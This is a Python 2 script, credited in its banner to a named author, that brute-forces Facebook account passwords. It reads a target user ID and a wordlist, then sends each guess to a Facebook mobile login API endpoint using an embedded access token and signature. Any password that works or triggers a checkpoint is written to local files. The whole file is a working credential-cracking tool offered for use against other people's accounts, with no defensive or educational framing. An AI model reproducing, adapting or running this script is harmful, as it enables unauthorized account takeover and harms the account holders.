# -*- coding: utf-8 -*-
import os, sys, time, datetime, random, json
from multiprocessing.pool import ThreadPool
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')


from mechanize import Browser
reload(sys)
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


logo = """\033[1;95m

    ▄▄▄▄▄▄▄    ╔═╗─╔╗╔═══╗╔╗──╔╗  ╔═╗╔═╗╔╗──╔╗╔═══╗
  \033[1;97m▄█████████▄  ║║╚╗║║║╔═╗║║╚╗╔╝║  ║║╚╝║║║╚╗╔╝║║╔═╗║
  ██─▀███▀─██  ║╔╗╚╝║║║─║║╚╗╚╝╔╝  ║╔╗╔╗║╚╗╚╝╔╝║║─║║
  ▀████▀████▀  ║║╚╗║║║╚═╝║─╚╗╔╝─  ║║║║║║─╚╗╔╝─║║─║║
    \033[1;97m██▀█▀██    ║║─║║║║╔═╗║──║║──  ║║║║║║──║║──║╚═╝║
               ╚╝─╚═╝╚╝─╚╝──╚╝──  ╚╝╚╝╚╝──╚╝──╚═══╝
\033[1;97m
Loading…
\033[1;95m█\033[1;97m▒▒▒▒▒▒▒▒▒ \033[1;96mAuthor  \033[1;97m:  Nay Myo (Bagyi Myo)
\033[1;97m30%
\033[1;95m███\033[1;97m▒▒▒▒▒▒▒ \033[1;96mCountry \033[1;97m:  MYANMAR
\033[1;97m50%
\033[1;95m███████\033[1;97m▒▒▒ \033[1;96mBlog    \033[1;97m:  naymyo15689.blogspot.com
\033[1;97m100%
\033[1;95m██████████ \033[1;96mGithub  \033[1;97m:  https://github.com/NayMyo969

\033[1;96m==================================================
"""


def ceknet():
    try:
        toolbar_width = 25
        for i in range(toolbar_width):
            sys.stdout.write('\r')
            sys.stdout.flush()
            sys.stdout.flush()
        try:
            rq = requests.get('http://facebook.com')
            time.sleep(3.5)
            time.sleep(2.0)
            start()
        except requests.exceptions.ConnectionError:
            time.sleep(1.5)
            sys.exit()

    except KeyboardInterrupt:
    	time.sleep(3.5)
        exit('\n\033[1;96m[[\033[1;95m♤ \033[1;97mNAY MYO \033[1;95m♤\033[1;96m]] \033[1;97mPROGRAM NAY MYO EXIT\n')

def start():
        try:
            os.system ('clear')
            print logo
            email = raw_input('\033[1;96m[[\033[1;95m♤ \033[1;97mNAY MYO \033[1;95m♤\033[1;96m]] \n\nTARGET USER NAME\033[1;95m/\033[1;96mID \033[1;95m╼\033[1;97m❯❯❯ ')
            passw = raw_input('\n\033[1;96m[[\033[1;95m♤ \033[1;97mNAY MYO \033[1;95m♤\033[1;96m]] \n\n\033[1;96mFILE WORLD LIST     \033[1;95m╼\033[1;97m❯❯❯ ')
            total = open(passw, 'r')
            total = total.readlines()
            print '\n\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;97mTARGET ID  \033[1;95m╼\033[1;97m❯❯❯\033[1;96m ' + email
            time.sleep(3.0)
            print '\n\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;97mTOTAL LIST \033[1;95m╼\033[1;97m❯❯❯\033[1;96m ' + str(len(total))
            time.sleep(3.0)
            print
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\n\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;97mATTACKING\033[1;95m╼\033[1;97m❯❯❯\033[1;96m'+email+'\033[1;95m╼\033[1;97m❯❯❯\033[36;1m '+pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('naymyo.txt', 'w')
                        dapat.write('[ID] ╼❯❯❯ ' + email + '\n')
                        dapat.write('[PW] ╼❯❯❯ ' + pw)
                        dapat.close()
                        print '\n\n\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mPASSWORD FOUND \033[1;96m[[\033[1;95m♤\033[1;97m]]'
                        print '\n\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mUSER NAME \033[1;95m╼\033[1;97m❯❯❯\033[1;95m '+email
                        print '\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mPASSWORD \033[1;95m╼\033[1;97m❯❯❯\033[1;95m '+pw
                        print '\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mYOUR ATTACKING \033[1;95m╼\033[1;97m❯❯❯  \033[1;95mSUCCESS'
                        print '\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mPROGRAM NAY MYO FINISHED'
                        sys.exit()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('naymyocheckpoint.txt', 'w')
                            ceks.write('[ID] ╼❯❯❯ ' + email + '\n')
                            ceks.write('[PW] ╼❯❯❯ ' + pw)
                            ceks.close()
                            print '\n\n\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mPASSWORD FOUND \033[1;96m[[\033[1;95m♤\033[1;96m]]'
                            print '\n\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mUSER NAME \033[1;95m╼\033[1;97m❯❯❯\033[1;95m '+email
                            print '\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mPASSWORD \033[1;95m╼\033[1;97m❯❯❯\033[1;95m '+pw
                            print '\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mYOUR ATTACKING \033[1;95m╼\033[1;97m❯❯❯  \033[1;95mCHEKPOINT'
                            print '\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mPROGRAM NAY MYO FINISH'
                            sys.exit()
                except requests.exceptions.ConnectionError:
                    print '\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;97mYOUR "MYANMAR" CONNECTION IS ERROR \033[1;96m[[\033[1;95m♤\033[1;96m]]'
                    sys.exit()

        except IOError:
            print '\n\033[1;96m[[\033[1;95m♤ \033[1;97mNAY MYO \033[1;95m♤\033[1;96m]]\n\n\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mTRY AGAIN YOUR PASSWORD LIST \033[1;96m[[\033[1;95m♤\033[1;96m]]'
            print '\n\033[1;96m[[\033[1;95m♤\033[1;96m]] \033[1;96mSEE U NEXT TIME MY FRIEND \033[1;96m[[\033[1;95m♤\033[1;96m]]'
            sys.exit()

ceknet()
